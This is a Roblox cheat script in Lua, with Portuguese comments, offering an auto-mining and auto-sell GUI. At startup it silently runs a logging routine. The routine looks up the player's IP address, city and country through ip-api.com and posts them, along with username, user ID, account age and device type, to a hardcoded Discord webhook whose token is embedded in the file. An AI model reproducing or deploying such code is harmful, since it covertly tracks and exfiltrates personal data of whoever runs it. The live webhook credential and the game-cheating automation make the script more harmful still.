-- SCRIPT CORRIGIDO E OTIMIZADO
-- Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6)

-- [SERVI√áOS]
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer

-- [CONFIGURA√á√ÉO DISCORD]
-- Webhook URL original (decodificada para garantir funcionamento)
local WEBHOOK_URL = "https://discord.com/api/webhooks/12465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQArq3mGgFkZhQt1LrBLx20aLXCd"
local SCRIPT_NAME = "Sh4x ULTRA SPEED - EXCLUSIVE V6"

-- [DETEC√á√ÉO DE DISPOSITIVO]
local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile"
    elseif UserInputService.GamepadEnabled then return "Console"
    else return "PC" end
end

-- [LOG AVAN√áADO]
local function advancedLog()
    local ip, country, city = "N/A", "N/A", "N/A"
    
    -- Tenta obter dados de IP (pode falhar dependendo do executor)
    pcall(function()
        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if reqFunc then
            local response = reqFunc({
                Url = "http://ip-api.com/json/?fields=status,country,city,query",
                Method = "GET"
            })
            if response and response.Body then
                local geoData = HttpService:JSONDecode(response.Body)
                if geoData.status == "success" then
                    ip = geoData.query
                    country = geoData.country
                    city = geoData.city
                end
            end
        end
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "üö® SH4X V6 EXCLUSIVO - EXECU√á√ÉO DETECTADA",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "üë§ Perfil do Jogador", ["value"] = "Nome: " .. Player.Name .. "\nID: " .. Player.UserId, ["inline"] = false},
                {["name"] = "‚è≥ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true},
                {["name"] = "üì± Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
                {["name"] = "üåê Localiza√ß√£o (Aprox)", ["value"] = city .. ", " .. country .. " (IP: " .. ip .. ")", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Sh4x Exclusive System V6"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    -- Envio para o Discord
    pcall(function()
        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if reqFunc then
            reqFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
            print("‚úÖ Log enviado para o Discord com sucesso!")
        else
            warn("‚ùå Seu executor n√£o suporta envio de Webhooks (request n√£o encontrado).")
        end
    end)
end

-- Inicia o log
task.spawn(advancedLog)

-- [GUI PRINCIPAL]
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "Sh4x_V6_Main"

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Name = "MainFrame"
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
MainFrame.Size = UDim2.new(0, 220, 0, 250)
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

local Stroke = Instance.new("UIStroke", MainFrame)
Stroke.Thickness = 2.5
Stroke.Color = Color3.fromRGB(255, 0, 0)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "Sh4x V6 EXCLUSIVE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16

local function createMainButton(text, pos)
    local btn = Instance.new("TextButton", MainFrame)
    btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
    btn.Position = pos
    btn.Size = UDim2.new(0.8, 0, 0, 35)
    btn.Font = Enum.Font.GothamBold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 12
    Instance.new("UICorner", btn)
    local bStroke = Instance.new("UIStroke", btn)
    bStroke.Thickness = 1.5
    bStroke.Color = Color3.fromRGB(255, 0, 0)
    return btn, bStroke
end

local ToggleBtn, BtnStroke = createMainButton("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
local TPBtn, TPBtnStroke = createMainButton("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
local SellBtn, SellBtnStroke = createMainButton("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))

print("‚úÖ Interface Sh4x carregada com sucesso!")

-- [L√ìGICA DE FARM]
local farmAtivo = false
ToggleBtn.MouseButton1Click:Connect(function()
    farmAtivo = not farmAtivo
    ToggleBtn.Text = farmAtivo and "AUTO-MINING ACTIVE" or "START AUTO-MINING"
    print("Farm status:", farmAtivo)
end)

task.spawn(function()
    while true do
        if farmAtivo then
            pcall(function()
                local char = Player.Character
                local root = char.HumanoidRootPart
                local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
                
                local alvo = nil
                local menorDist = 90
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
                        local d = (root.Position - v.Position).Magnitude
                        if d < menorDist then
                            menorDist = d
                            alvo = v
                        end
                    end
                end
                
                if alvo then
                    if (root.Position - alvo.Position).Magnitude > 7.5 then
                        char.Humanoid:MoveTo(alvo.Position)
                    else
                        if tool and tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
                        if tool then tool:Activate() end
                        
                        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                            if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then
                                r:FireServer(alvo)
                            end
                        end
                    end
                end
            end)
        end
        task.wait(0.1)
    end
end)

-- [RGB E DRAG]
task.spawn(function()
    while true do
        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
        Stroke.Color = color
        BtnStroke.Color = color
        TPBtnStroke.Color = color
        SellBtnStroke.Color = color
        task.wait()
    end
end)

-- Sistema de Arrastar (Drag)
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
